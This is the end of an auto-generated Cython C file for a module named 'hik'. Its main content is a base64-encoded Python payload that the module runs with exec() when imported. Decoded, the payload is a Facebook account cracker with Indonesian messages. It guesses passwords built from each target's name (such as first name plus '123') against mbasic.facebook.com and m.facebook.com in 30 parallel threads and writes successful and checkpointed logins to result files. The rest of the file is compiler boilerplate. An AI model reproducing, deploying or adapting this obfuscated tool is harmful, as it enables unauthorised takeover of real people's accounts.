ICAgICAgaWYgbGVuKHh6KSA9PSAzIG9yIGxlbih4eikgPT0gNCBvciBsZW4oeHopID09IDUgb3IgbGVuKHh6KSA9PSA2Og0KICAgICAgICAgICAgICAgICAgICAgICAgICAgIHB3eCA9IFtuYW1lLCB4elswXSsiMTIzIiwgeHpbMF0reHpbMV0sIHh6WzBdKyIxMjM0NSJdDQogICAgICAgICAgICAgICAgICAgICAgICBlbHNlOg0KICAgICAgICAgICAgICAgICAgICAgICAgICAgIHB3eCA9IFtuYW1lLCB4elswXSsiMTIzIiwgeHpbMF0reHpbMV0sIHh6WzBdKyIxMjM0NSJdDQogICAgICAgICAgICAgICAgICAgICAgICBraXJpbS5zdWJtaXQoc2VsZi5fX2FwaV9fLCB1aWQsIHB3eCkNCiAgICAgICAgICAgICAgICAgICAgZXhjZXB0Og0KICAgICAgICAgICAgICAgICAgICAgICAgcGFzcw0KDQogICAgICAgICAgICBoYXNpbChvayxjcCkNCiAgICAgICAgZWxpZiB5YW4gaW4gKCcyJywgJzAyJyk6DQogICAgICAgICAgICBwcmludCgnXG4gWyVzKyVzXSBoYXNpbCBPSyBkaXNpbXBhbiBrZSAtPiByZXN1bHRzL09LLSVzLSVzLSVzLnR4dCclKE8sSCxoYSwgb3AsIHRhKSkNCiAgICAgICAgICAgIHByaW50KCcgWyVzKyVzXSBoYXNpbCBDUCBkaXNpbXBhbiBrZSAtPiByZXN1bHRzL0NQLSVzLSVzLSVzLnR4dCclKE8sSCxoYSwgb3AsIHRhKSkNCiAgICAgICAgICAgIHByaW50KCdcbiBbJXMhJXNdIGFuZGEgYmlzYSBtZW1hdGlrYW4gZGF0YSBzZWx1bGFyIHVudHVrIG1lbmpl""ZGEgcHJvc2VzIGNyYWNrXG4nJShPLEgpKQ0KICAgICAgICAgICAgd2l0aCBZYXlhbkdhbnRlbmcobWF4X3dvcmtlcnM9MzApIGFzIGtpcmltOg0KICAgICAgICAgICAgICAgIGZvciB5bnRrdHMgaW4gc2VsZi5pZDogIyBZbyBOZGFrIFRhdSBLb2sgVGFueWEgU2FpYQ0KICAgICAgICAgICAgICAgICAgICB0cnk6DQogICAgICAgICAgICAgICAgICAgICAgICB1aWQsIG5hbWUgPSB5bnRrdHMuc3BsaXQoJzw9PicpDQogICAgICAgICAgICAgICAgICAgICAgICB4eiA9IG5hbWUuc3BsaXQoJyAnKQ0KICAgICAgICAgICAgICAgICAgICAgICAgaWYgbGVuKHh6KSA9PSAzIG9yIGxlbih4eikgPT0gNCBvciBsZW4oeHopID09IDUgb3IgbGVuKHh6KSA9PSA2Og0KICAgICAgICAgICAgICAgICAgICAgICAgICAgIHB3eCA9IFtuYW1lLCB4elswXSsiMTIzIiwgeHpbMF0reHpbMV0sIHh6WzBdKyIxMjM0NSJdDQogICAgICAgICAgICAgICAgICAgICAgICBlbHNlOg0KICAgICAgICAgICAgICAgICAgICAgICAgICAgIHB3eCA9IFtuYW1lLCB4elswXSsiMTIzIiwgeHpbMF0reHpbMV0sIHh6WzBdKyIxMjM0NSJdDQogICAgICAgICAgICAgICAgICAgICAgICBraXJpbS5zdWJtaXQoc2VsZi5fX21ldG9kZV9fLCB1aWQsIHB3eCwgIm1iYXNpYy5mYWNlYm9vay5jb20iKQ0KICAgICAgICAgICAgICAgICAgICBleGNlcHQ6DQogICAgICAgICAgICAgICAgICAgICAgICBwYXNzDQoNCiAgICAgICAgICAgIGhhc2lsKG9rLGNwKQ0KICAgICAgICBlbGlmIHlhbiBpbiAoJzMnLCAnMDMnKToNCiAgICAgICAgICAgIHByaW50KCdcbiBbJXMrJXNdIGhhc2lsIE9LIGRpc2ltcGFuIGtlIC0+IHJlc3VsdHMvT0stJXMtJXMtJXMudHh0JyUoTyxILGhhLCBvcCwgdGEpKQ0KICAgICAgICAgICAgcHJpbnQoJyBbJXMrJXNdIGhhc2lsIENQIGRpc2ltcGFuIGtlIC0+IHJlc3VsdHMvQ1AtJXMtJXMtJXMudHh0JyUoTyxILGhhLCBvcCwgdGEpKQ0KICAgICAgICAgICAgcHJpbnQoJ1xuIFslcyElc10gYW5kYSBiaXNhIG1lbWF0aWthbiBkYXRhIHNlbHVsYXIgdW50dWsgbWVuamVkYSBwcm9zZXMgY3JhY2tcbiclKE0sTikpDQogICAgICAgICAgICB3aXRoIFlheWFuR2FudGVuZyhtYXhfd29ya2Vycz0zMCkgYXMga2lyaW06DQogICAgICAgICAgICAgICAgZm9yIHludGt0cyBpbiBzZWxmLmlkOiAjIFlvIE5kYWsgVGF1IEtvayBUYW55YSBTYWlhDQogICAgICAgICAgICAgICAgICAgIHRyeToNCiAgICAgICAgICAgICAgICAgICAgICAgIHVpZCwgbmFtZSA9IHludGt0cy5zcGxpdCgnPD0+JykNCiAgICAgICAgICAgICAgICAgICAgICAgIHh6ID0gbmFtZS5zcGxpdCgnICcpDQogICAgICAgICAgICAgICAgICAgICAgICBpZiBsZW4oeHopID09IDMgb3IgbGVuKHh6KSA9PSA0IG9yIGxlbih4eikgPT0gNSBvciBsZW4oeHopID09IDY6DQogICAgICAgICAgICAgICAgICAgICAgICAgICAgcHd4ID0gW25hbWUsIHh6WzBdKyIxMjMiLCB4elswXSt4elsxXSwgeHpbMF0rIjEyMzQ1Il0N""CiAgICAgICAgICAgICAgICAgICAgICAgIGVsc2U6DQogICAgICAgICAgICAgICAgICAgICAgICAgICAgcHd4ID0gW25hbWUsIHh6WzBdKyIxMjMiLCB4elswXSt4elsxXSwgeHpbMF0rIjEyMzQ1Il0NCiAgICAgICAgICAgICAgICAgICAgICAgIGtpcmltLnN1Ym1pdChzZWxmLl9fbWV0b2RlX18sIHVpZCwgcHd4LCAibS5mYWNlYm9vay5jb20iKQ0KICAgICAgICAgICAgICAgICAgICBleGNlcHQ6DQogICAgICAgICAgICAgICAgICAgICAgICBwYXNzDQoNCiAgICAgICAgICAgIGhhc2lsKG9rLGNwKQ0KICAgICAgICBlbHNlOg0KICAgICAgICAgICAgcHJpbnQoJ1xuICVzWyVzw5clc10gaW5wdXQgeWFuZyBiZW5lciclKE4sTSxOKSk7c2VsZi5fX3BsZXJfXygpDQoNCg0KaWYgX19uYW1lX18gPT0gJ19fbWFpbl9fJzoNCiAgICBtb2NoX3lheWFuKCk=";
static PyObject *__pyx_kp_s_IyAtKi0gY29kaW5nOiB1dGYtOCAtKi0N;
static PyObject *__pyx_n_s_b64decode;
static PyObject *__pyx_n_s_base64;
static PyObject *__pyx_n_s_builtins;
static PyObject *__pyx_n_s_cline_in_traceback;
static PyObject *__pyx_n_s_import;
static PyObject *__pyx_n_s_main;
static PyObject *__pyx_n_s_name;
static PyObject *__pyx_n_s_test;
static PyObject *__pyx_tuple_;
/* Late includes */

static PyMethodDef __pyx_methods[] = {
  {0, 0, 0, 0}
};

#if PY_MAJOR_VERSION >= 3
#if CYTHON_PEP489_MULTI_PHASE_INIT
static PyObject* __pyx_pymod_create(PyObject *spec, PyModuleDef *def); /*proto*/
static int __pyx_pymod_exec_hik(PyObject* module); /*proto*/
static PyModuleDef_Slot __pyx_moduledef_slots[] = {
  {Py_mod_create, (void*)__pyx_pymod_create},
  {Py_mod_exec, (void*)__pyx_pymod_exec_hik},
  {0, NULL}
};
#endif

static struct PyModuleDef __pyx_moduledef = {
    PyModuleDef_HEAD_INIT,
    "hik",
    0, /* m_doc */
  #if CYTHON_PEP489_MULTI_PHASE_INIT
    0, /* m_size */
  #else
    -1, /* m_size */
  #endif
    __pyx_methods /* m_methods */,
  #if CYTHON_PEP489_MULTI_PHASE_INIT
    __pyx_moduledef_slots, /* m_slots */
  #else
    NULL, /* m_reload */
  #endif
    NULL, /* m_traverse */
    NULL, /* m_clear */
    NULL /* m_free */
};
#endif
#ifndef CYTHON_SMALL_CODE
#if defined(__clang__)
    #define CYTHON_SMALL_CODE
#elif defined(__GNUC__) && (__GNUC__ > 4 || (__GNUC__ == 4 && __GNUC_MINOR__ >= 3))
    #define CYTHON_SMALL_CODE __attribute__((cold))
#else
    #define CYTHON_SMALL_CODE
#endif
#endif

static __Pyx_StringTabEntry __pyx_string_tab[] = {
  {&__pyx_kp_s_IyAtKi0gY29kaW5nOiB1dGYtOCAtKi0N, __pyx_k_IyAtKi0gY29kaW5nOiB1dGYtOCAtKi0N, sizeof(__pyx_k_IyAtKi0gY29kaW5nOiB1dGYtOCAtKi0N), 0, 0, 1, 0},
  {&__pyx_n_s_b64decode, __pyx_k_b64decode, sizeof(__pyx_k_b64decode), 0, 0, 1, 1},
  {&__pyx_n_s_base64, __pyx_k_base64, sizeof(__pyx_k_base64), 0, 0, 1, 1},
  {&__pyx_n_s_builtins, __pyx_k_builtins, sizeof(__pyx_k_builtins), 0, 0, 1, 1},
  {&__pyx_n_s_cline_in_traceback, __pyx_k_cline_in_traceback, sizeof(__pyx_k_cline_in_traceback), 0, 0, 1, 1},
  {&__pyx_n_s_import, __pyx_k_import, sizeof(__pyx_k_import), 0, 0, 1, 1},
  {&__pyx_n_s_main, __pyx_k_main, sizeof(__pyx_k_main), 0, 0, 1, 1},
  {&__pyx_n_s_name, __pyx_k_name, sizeof(__pyx_k_name), 0, 0, 1, 1},
  {&__pyx_n_s_test, __pyx_k_test, sizeof(__pyx_k_test), 0, 0, 1, 1},
  {0, 0, 0, 0, 0, 0, 0}
};
static CYTHON_SMALL_CODE int __Pyx_InitCachedBuiltins(void) {
  return 0;
}

static CYTHON_SMALL_CODE int __Pyx_InitCachedConstants(void) {
  __Pyx_RefNannyDeclarations
  __Pyx_RefNannySetupContext("__Pyx_InitCachedConstants", 0);

  /* "hik.pyx":2
 * import base64
 * exec(base64.b64decode(""))             # <<<<<<<<<<<<<<
 */
  __pyx_tuple_ = PyTuple_Pack(1, __pyx_kp_s_IyAtKi0gY29kaW5nOiB1dGYtOCAtKi0N); if (unlikely(!__pyx_tuple_)) __PYX_ERR(0, 2, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_tuple_);
  __Pyx_GIVEREF(__pyx_tuple_);
  __Pyx_RefNannyFinishContext();
  return 0;
  __pyx_L1_error:;
  __Pyx_RefNannyFinishContext();
  return -1;
}

static CYTHON_SMALL_CODE int __Pyx_InitGlobals(void) {
  if (__Pyx_InitStrings(__pyx_string_tab) < 0) __PYX_ERR(0, 1, __pyx_L1_error);
  return 0;
  __pyx_L1_error:;
  return -1;
}

static CYTHON_SMALL_CODE int __Pyx_modinit_global_init_code(void); /*proto*/
static CYTHON_SMALL_CODE int __Pyx_modinit_variable_export_code(void); /*proto*/
static CYTHON_SMALL_CODE int __Pyx_modinit_function_export_code(void); /*proto*/
static CYTHON_SMALL_CODE int __Pyx_modinit_type_init_code(void); /*proto*/
static CYTHON_SMALL_CODE int __Pyx_modinit_type_import_code(void); /*proto*/
static CYTHON_SMALL_CODE int __Pyx_modinit_variable_import_code(void); /*proto*/
static CYTHON_SMALL_CODE int __Pyx_modinit_function_import_code(void); /*proto*/

static int __Pyx_modinit_global_init_code(void) {
  __Pyx_RefNannyDeclarations
  __Pyx_RefNannySetupContext("__Pyx_modinit_global_init_code", 0);
  /*--- Global init code ---*/
  __Pyx_RefNannyFinishContext();
  return 0;
}

static int __Pyx_modinit_variable_export_code(void) {
  __Pyx_RefNannyDeclarations
  __Pyx_RefNannySetupContext("__Pyx_modinit_variable_export_code", 0);
  /*--- Variable export code ---*/
  __Pyx_RefNannyFinishContext();
  return 0;
}

static int __Pyx_modinit_function_export_code(void) {
  __Pyx_RefNannyDeclarations
  __Pyx_RefNannySetupContext("__Pyx_modinit_function_export_code", 0);
  /*--- Function export code ---*/
  __Pyx_RefNannyFinishContext();
  return 0;
}

static int __Pyx_modinit_type_init_code(void) {
  __Pyx_RefNannyDeclarations
  __Pyx_RefNannySetupContext("__Pyx_modinit_type_init_code", 0);
  /*--- Type init code ---*/
  __Pyx_RefNannyFinishContext();
  return 0;
}

static int __Pyx_modinit_type_import_code(void) {
  __Pyx_RefNannyDeclarations
  __Pyx_RefNannySetupContext("__Pyx_modinit_type_import_code", 0);
  /*--- Type import code ---*/
  __Pyx_RefNannyFinishContext();
  return 0;
}

static int __Pyx_modinit_variable_import_code(void) {
  __Pyx_RefNannyDeclarations
  __Pyx_RefNannySetupContext("__Pyx_modinit_variable_import_code", 0);
  /*--- Variable import code ---*/
  __Pyx_RefNannyFinishContext();
  return 0;
}

static int __Pyx_modinit_function_import_code(void) {
  __Pyx_RefNannyDeclarations
  __Pyx_RefNannySetupContext("__Pyx_modinit_function_import_code", 0);
  /*--- Function import code ---*/
  __Pyx_RefNannyFinishContext();
  return 0;
}


#ifndef CYTHON_NO_PYINIT_EXPORT
#define __Pyx_PyMODINIT_FUNC PyMODINIT_FUNC
#elif PY_MAJOR_VERSION < 3
#ifdef __cplusplus
#define __Pyx_PyMODINIT_FUNC extern "C" void
#else
#define __Pyx_PyMODINIT_FUNC void
#endif
#else
#ifdef __cplusplus
#define __Pyx_PyMODINIT_FUNC extern "C" PyObject *
#else
#define __Pyx_PyMODINIT_FUNC PyObject *
#endif
#endif


#if PY_MAJOR_VERSION < 3
__Pyx_PyMODINIT_FUNC inithik(void) CYTHON_SMALL_CODE; /*proto*/
__Pyx_PyMODINIT_FUNC inithik(void)
#else
__Pyx_PyMODINIT_FUNC PyInit_hik(void) CYTHON_SMALL_CODE; /*proto*/
__Pyx_PyMODINIT_FUNC PyInit_hik(void)
#if CYTHON_PEP489_MULTI_PHASE_INIT
{
  return PyModuleDef_Init(&__pyx_moduledef);
}
static CYTHON_SMALL_CODE int __Pyx_check_single_interpreter(void) {
    #if PY_VERSION_HEX >= 0x030700A1
    static PY_INT64_T main_interpreter_id = -1;
    PY_INT64_T current_id = PyInterpreterState_GetID(PyThreadState_Get()->interp);
    if (main_interpreter_id == -1) {
        main_interpreter_id = current_id;
        return (unlikely(current_id == -1)) ? -1 : 0;
    } else if (unlikely(main_interpreter_id != current_id))
    #else
    static PyInterpreterState *main_interpreter = NULL;
    PyInterpreterState *current_interpreter = PyThreadState_Get()->interp;
    if (!main_interpreter) {
        main_interpreter = current_interpreter;
    } else if (unlikely(main_interpreter != current_interpreter))
    #endif
    {
        PyErr_SetString(
            PyExc_ImportError,
            "Interpreter change detected - this module can only be loaded into one interpreter per process.");
        return -1;
    }
    return 0;
}
static CYTHON_SMALL_CODE int __Pyx_copy_spec_to_module(PyObject *spec, PyObject *moddict, const char* from_name, const char* to_name, int allow_none) {
    PyObject *value = PyObject_GetAttrString(spec, from_name);
    int result = 0;
    if (likely(value)) {
        if (allow_none || value != Py_None) {
            result = PyDict_SetItemString(moddict, to_name, value);
        }
        Py_DECREF(value);
    } else if (PyErr_ExceptionMatches(PyExc_AttributeError)) {
        PyErr_Clear();
    } else {
        result = -1;
    }
    return result;
}
static CYTHON_SMALL_CODE PyObject* __pyx_pymod_create(PyObject *spec, CYTHON_UNUSED PyModuleDef *def) {
    PyObject *module = NULL, *moddict, *modname;
    if (__Pyx_check_single_interpreter())
        return NULL;
    if (__pyx_m)
        return __Pyx_NewRef(__pyx_m);
    modname = PyObject_GetAttrString(spec, "name");
    if (unlikely(!modname)) goto bad;
    module = PyModule_NewObject(modname);
    Py_DECREF(modname);
    if (unlikely(!module)) goto bad;
    moddict = PyModule_GetDict(module);
    if (unlikely(!moddict)) goto bad;
    if (unlikely(__Pyx_copy_spec_to_module(spec, moddict, "loader", "__loader__", 1) < 0)) goto bad;
    if (unlikely(__Pyx_copy_spec_to_module(spec, moddict, "origin", "__file__", 1) < 0)) goto bad;
    if (unlikely(__Pyx_copy_spec_to_module(spec, moddict, "parent", "__package__", 1) < 0)) goto bad;
    if (unlikely(__Pyx_copy_spec_to_module(spec, moddict, "submodule_search_locations", "__path__", 0) < 0)) goto bad;
    return module;
bad:
    Py_XDECREF(module);
    return NULL;
}


static CYTHON_SMALL_CODE int __pyx_pymod_exec_hik(PyObject *__pyx_pyinit_module)
#endif
#endif
{
  PyObject *__pyx_t_1 = NULL;
  PyObject *__pyx_t_2 = NULL;
  PyObject *__pyx_t_3 = NULL;
  int __pyx_lineno = 0;
  const char *__pyx_filename = NULL;
  int __pyx_clineno = 0;
  __Pyx_RefNannyDeclarations
  #if CYTHON_PEP489_MULTI_PHASE_INIT
  if (__pyx_m) {
    if (__pyx_m == __pyx_pyinit_module) return 0;
    PyErr_SetString(PyExc_RuntimeError, "Module 'hik' has already been imported. Re-initialisation is not supported.");
    return -1;
  }
  #elif PY_MAJOR_VERSION >= 3
  if (__pyx_m) return __Pyx_NewRef(__pyx_m);
  #endif
  #if CYTHON_REFNANNY
__Pyx_RefNanny = __Pyx_RefNannyImportAPI("refnanny");
if (!__Pyx_RefNanny) {
  PyErr_Clear();
  __Pyx_RefNanny = __Pyx_RefNannyImportAPI("Cython.Runtime.refnanny");
  if (!__Pyx_RefNanny)
      Py_FatalError("failed to import 'refnanny' module");
}
#endif
  __Pyx_RefNannySetupContext("__Pyx_PyMODINIT_FUNC PyInit_hik(void)", 0);
  if (__Pyx_check_binary_version() < 0) __PYX_ERR(0, 1, __pyx_L1_error)
  #ifdef __Pxy_PyFrame_Initialize_Offsets
  __Pxy_PyFrame_Initialize_Offsets();
  #endif
  __pyx_empty_tuple = PyTuple_New(0); if (unlikely(!__pyx_empty_tuple)) __PYX_ERR(0, 1, __pyx_L1_error)
  __pyx_empty_bytes = PyBytes_FromStringAndSize("", 0); if (unlikely(!__pyx_empty_bytes)) __PYX_ERR(0, 1, __pyx_L1_error)
  __pyx_empty_unicode = PyUnicode_FromStringAndSize("", 0); if (unlikely(!__pyx_empty_unicode)) __PYX_ERR(0, 1, __pyx_L1_error)
  #ifdef __Pyx_CyFunction_USED
  if (__pyx_CyFunction_init() < 0) __PYX_ERR(0, 1, __pyx_L1_error)
  #endif
  #ifdef __Pyx_FusedFunction_USED
  if (__pyx_FusedFunction_init() < 0) __PYX_ERR(0, 1, __pyx_L1_error)
  #endif
  #ifdef __Pyx_Coroutine_USED
  if (__pyx_Coroutine_init() < 0) __PYX_ERR(0, 1, __pyx_L1_error)
  #endif
  #ifdef __Pyx_Generator_USED
  if (__pyx_Generator_init() < 0) __PYX_ERR(0, 1, __pyx_L1_error)
  #endif
  #ifdef __Pyx_AsyncGen_USED
  if (__pyx_AsyncGen_init() < 0) __PYX_ERR(0, 1, __pyx_L1_error)
  #endif
  #ifdef __Pyx_StopAsyncIteration_USED
  if (__pyx_StopAsyncIteration_init() < 0) __PYX_ERR(0, 1, __pyx_L1_error)
  #endif
  /*--- Library function declarations ---*/
  /*--- Threads initialization code ---*/
  #if defined(WITH_THREAD) && PY_VERSION_HEX < 0x030700F0 && defined(__PYX_FORCE_INIT_THREADS) && __PYX_FORCE_INIT_THREADS
  PyEval_InitThreads();
  #endif
  /*--- Module creation code ---*/
  #if CYTHON_PEP489_MULTI_PHASE_INIT
  __pyx_m = __pyx_pyinit_module;
  Py_INCREF(__pyx_m);
  #else
  #if PY_MAJOR_VERSION < 3
  __pyx_m = Py_InitModule4("hik", __pyx_methods, 0, 0, PYTHON_API_VERSION); Py_XINCREF(__pyx_m);
  #else
  __pyx_m = PyModule_Create(&__pyx_moduledef);
  #endif
  if (unlikely(!__pyx_m)) __PYX_ERR(0, 1, __pyx_L1_error)
  #endif
  __pyx_d = PyModule_GetDict(__pyx_m); if (unlikely(!__pyx_d)) __PYX_ERR(0, 1, __pyx_L1_error)
  Py_INCREF(__pyx_d);
  __pyx_b = PyImport_AddModule(__Pyx_BUILTIN_MODULE_NAME); if (unlikely(!__pyx_b)) __PYX_ERR(0, 1, __pyx_L1_error)
  Py_INCREF(__pyx_b);
  __pyx_cython_runtime = PyImport_AddModule((char *) "cython_runtime"); if (unlikely(!__pyx_cython_runtime)) __PYX_ERR(0, 1, __pyx_L1_error)
  Py_INCREF(__pyx_cython_runtime);
  if (PyObject_SetAttrString(__pyx_m, "__builtins__", __pyx_b) < 0) __PYX_ERR(0, 1, __pyx_L1_error);
  /*--- Initialize various global constants etc. ---*/
  if (__Pyx_InitGlobals() < 0) __PYX_ERR(0, 1, __pyx_L1_error)
  #if PY_MAJOR_VERSION < 3 && (__PYX_DEFAULT_STRING_ENCODING_IS_ASCII || __PYX_DEFAULT_STRING_ENCODING_IS_DEFAULT)
  if (__Pyx_init_sys_getdefaultencoding_params() < 0) __PYX_ERR(0, 1, __pyx_L1_error)
  #endif
  if (__pyx_module_is_main_hik) {
    if (PyObject_SetAttr(__pyx_m, __pyx_n_s_name, __pyx_n_s_main) < 0) __PYX_ERR(0, 1, __pyx_L1_error)
  }
  #if PY_MAJOR_VERSION >= 3
  {
    PyObject *modules = PyImport_GetModuleDict(); if (unlikely(!modules)) __PYX_ERR(0, 1, __pyx_L1_error)
    if (!PyDict_GetItemString(modules, "hik")) {
      if (unlikely(PyDict_SetItemString(modules, "hik", __pyx_m) < 0)) __PYX_ERR(0, 1, __pyx_L1_error)
    }
  }
  #endif
  /*--- Builtin init code ---*/
  if (__Pyx_InitCachedBuiltins() < 0) __PYX_ERR(0, 1, __pyx_L1_error)
  /*--- Constants init code ---*/
  if (__Pyx_InitCachedConstants() < 0) __PYX_ERR(0, 1, __pyx_L1_error)
  /*--- Global type/function init code ---*/
  (void)__Pyx_modinit_global_init_code();
  (void)__Pyx_modinit_variable_export_code();
  (void)__Pyx_modinit_function_export_code();
  (void)__Pyx_modinit_type_init_code();
  (void)__Pyx_modinit_type_import_code();
  (void)__Pyx_modinit_variable_import_code();
  (void)__Pyx_modinit_function_import_code();
  /*--- Execution code ---*/
  #if defined(__Pyx_Generator_USED) || defined(__Pyx_Coroutine_USED)
  if (__Pyx_patch_abc() < 0) __PYX_ERR(0, 1, __pyx_L1_error)
  #endif

  /* "hik.pyx":1
 * import base64             # <<<<<<<<<<<<<<
 * exec(base64.b64decode(""))
 */
  __pyx_t_1 = __Pyx_Import(__pyx_n_s_base64, 0, -1); if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 1, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_1);
  if (PyDict_SetItem(__pyx_d, __pyx_n_s_base64, __pyx_t_1) < 0) __PYX_ERR(0, 1, __pyx_L1_error)
  __Pyx_DECREF(__pyx_t_1); __pyx_t_1 = 0;

  /* "hik.pyx":2
 * import base64
 * exec(base64.b64decode(""))             # <<<<<<<<<<<<<<
 */
  __Pyx_GetModuleGlobalName(__pyx_t_1, __pyx_n_s_base64); if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 2, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_1);
  __pyx_t_2 = __Pyx_PyObject_GetAttrStr(__pyx_t_1, __pyx_n_s_b64decode); if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 2, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_2);
  __Pyx_DECREF(__pyx_t_1); __pyx_t_1 = 0;
  __pyx_t_1 = __Pyx_PyObject_Call(__pyx_t_2, __pyx_tuple_, NULL); if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 2, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_1);
  __Pyx_DECREF(__pyx_t_2); __pyx_t_2 = 0;
  __pyx_t_2 = __Pyx_Globals(); if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 2, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_2);
  __pyx_t_3 = __Pyx_PyExec3(__pyx_t_1, __pyx_t_2, 0);
  __Pyx_DECREF(__pyx_t_1); __pyx_t_1 = 0;
  __Pyx_DECREF(__pyx_t_2); __pyx_t_2 = 0;
  if (unlikely(!__pyx_t_3)) __PYX_ERR(0, 2, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_3);
  __Pyx_DECREF(__pyx_t_3); __pyx_t_3 = 0;

  /* "hik.pyx":1
 * import base64             # <<<<<<<<<<<<<<
 * exec(base64.b64decode(""))
 */
  __pyx_t_3 = __Pyx_PyDict_NewPresized(0); if (unlikely(!__pyx_t_3)) __PYX_ERR(0, 1, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_3);
  if (PyDict_SetItem(__pyx_d, __pyx_n_s_test, __pyx_t_3) < 0) __PYX_ERR(0, 1, __pyx_L1_error)
  __Pyx_DECREF(__pyx_t_3); __pyx_t_3 = 0;

  /*--- Wrapped vars code ---*/

  goto __pyx_L0;
  __pyx_L1_error:;
  __Pyx_XDECREF(__pyx_t_1);
  __Pyx_XDECREF(__pyx_t_2);
  __Pyx_XDECREF(__pyx_t_3);
  if (__pyx_m) {
    if (__pyx_d) {
      __Pyx_AddTraceback("init hik", __pyx_clineno, __pyx_lineno, __pyx_filename);
    }
    Py_CLEAR(__pyx_m);
  } else if (!PyErr_Occurred()) {
    PyErr_SetString(PyExc_ImportError, "init hik");
  }
  __pyx_L0:;
  __Pyx_RefNannyFinishContext();
  #if CYTHON_PEP489_MULTI_PHASE_INIT
  return (__pyx_m != NULL) ? 0 : -1;
  #elif PY_MAJOR_VERSION >= 3
  return __pyx_m;
  #else
  return;
  #endif
}

/* --- Runtime support code --- */
/* Refnanny */
#if CYTHON_REFNANNY
static __Pyx_RefNannyAPIStruct *__Pyx_RefNannyImportAPI(const char *modname) {
    PyObject *m = NULL, *p = NULL;
    void *r = NULL;
    m = PyImport_ImportModule(modname);
    if (!m) goto end;
    p = PyObject_GetAttrString(m, "RefNannyAPI");
    if (!p) goto end;
    r = PyLong_AsVoidPtr(p);
end:
    Py_XDECREF(p);
    Py_XDECREF(m);
    return (__Pyx_RefNannyAPIStruct *)r;
}
#endif

/* PyObjectGetAttrStr */
#if CYTHON_USE_TYPE_SLOTS
static CYTHON_INLINE PyObject* __Pyx_PyObject_GetAttrStr(PyObject* obj, PyObject* attr_name) {
    PyTypeObject* tp = Py_TYPE(obj);
    if (likely(tp->tp_getattro))
        return tp->tp_getattro(obj, attr_name);
#if PY_MAJOR_VERSION < 3
    if (likely(tp->tp_getattr))
        return tp->tp_getattr(obj, PyString_AS_STRING(attr_name));
#endif
    return PyObject_GetAttr(obj, attr_name);
}
#endif

/* Import */
static PyObject *__Pyx_Import(PyObject *name, PyObject *from_list, int level) {
    PyObject *empty_list = 0;
    PyObject *module = 0;
    PyObject *global_dict = 0;
    PyObject *empty_dict = 0;
    PyObject *list;
    #if PY_MAJOR_VERSION < 3
    PyObject *py_import;
    py_import = __Pyx_PyObject_GetAttrStr(__pyx_b, __pyx_n_s_import);
    if (!py_import)
        goto bad;
    #endif
    if (from_list)
        list = from_list;
    else {
        empty_list = PyList_New(0);
        if (!empty_list)
            goto bad;
        list = empty_list;
    }
    global_dict = PyModule_GetDict(__pyx_m);
    if (!global_dict)
        goto bad;
    empty_dict = PyDict_New();
    if (!empty_dict)
        goto bad;
    {
        #if PY_MAJOR_VERSION >= 3
        if (level == -1) {
            if ((1) && (strchr(__Pyx_MODULE_NAME, '.'))) {
                module = PyImport_ImportModuleLevelObject(
                    name, global_dict, empty_dict, list, 1);
                if (!module) {
                    if (!PyErr_ExceptionMatches(PyExc_ImportError))
                        goto bad;
                    PyErr_Clear();
                }
            }
            level = 0;
        }
        #endif
        if (!module) {
            #if PY_MAJOR_VERSION < 3
            PyObject *py_level = PyInt_FromLong(level);
            if (!py_level)
                goto bad;
            module = PyObject_CallFunctionObjArgs(py_import,
                name, global_dict, empty_dict, list, py_level, (PyObject *)NULL);
            Py_DECREF(py_level);
            #else
            module = PyImport_ImportModuleLevelObject(
                name, global_dict, empty_dict, list, level);
            #endif
        }
    }
bad:
    #if PY_MAJOR_VERSION < 3
    Py_XDECREF(py_import);
    #endif
    Py_XDECREF(empty_list);
    Py_XDECREF(empty_dict);
    return module;
}

/* GetBuiltinName */
static PyObject *__Pyx_GetBuiltinName(PyObject *name) {
    PyObject* result = __Pyx_PyObject_GetAttrStr(__pyx_b, name);
    if (unlikely(!result)) {
        PyErr_Format(PyExc_NameError,
#if PY_MAJOR_VERSION >= 3
            "name '%U' is not defined", name);
#else
            "name '%.200s' is not defined", PyString_AS_STRING(name));
#endif
    }
    return result;
}

/* PyDictVersioning */
#if CYTHON_USE_DICT_VERSIONS && CYTHON_USE_TYPE_SLOTS
static CYTHON_INLINE PY_UINT64_T __Pyx_get_tp_dict_version(PyObject *obj) {
    PyObject *dict = Py_TYPE(obj)->tp_dict;
    return likely(dict) ? __PYX_GET_DICT_VERSION(dict) : 0;
}
static CYTHON_INLINE PY_UINT64_T __Pyx_get_object_dict_version(PyObject *obj) {
    PyObject **dictptr = NULL;
    Py_ssize_t offset = Py_TYPE(obj)->tp_dictoffset;
    if (offset) {
#if CYTHON_COMPILING_IN_CPYTHON
        dictptr = (likely(offset > 0)) ? (PyObject **) ((char *)obj + offset) : _PyObject_GetDictPtr(obj);
#else
        dictptr = _PyObject_GetDictPtr(obj);
#endif
    }
    return (dictptr && *dictptr) ? __PYX_GET_DICT_VERSION(*dictptr) : 0;
}
static CYTHON_INLINE int __Pyx_object_dict_version_matches(PyObject* obj, PY_UINT64_T tp_dict_version, PY_UINT64_T obj_dict_version) {
    PyObject *dict = Py_TYPE(obj)->tp_dict;
    if (unlikely(!dict) || unlikely(tp_dict_version != __PYX_GET_DICT_VERSION(dict)))
        return 0;
    return obj_dict_version == __Pyx_get_object_dict_version(obj);
}
#endif

/* GetModuleGlobalName */
#if CYTHON_USE_DICT_VERSIONS
static PyObject *__Pyx__GetModuleGlobalName(PyObject *name, PY_UINT64_T *dict_version, PyObject **dict_cached_value)
#else
static CYTHON_INLINE PyObject *__Pyx__GetModuleGlobalName(PyObject *name)
#endif
{
    PyObject *result;
#if !CYTHON_AVOID_BORROWED_REFS
#if CYTHON_COMPILING_IN_CPYTHON && PY_VERSION_HEX >= 0x030500A1
    result = _PyDict_GetItem_KnownHash(__pyx_d, name, ((PyASCIIObject *) name)->hash);
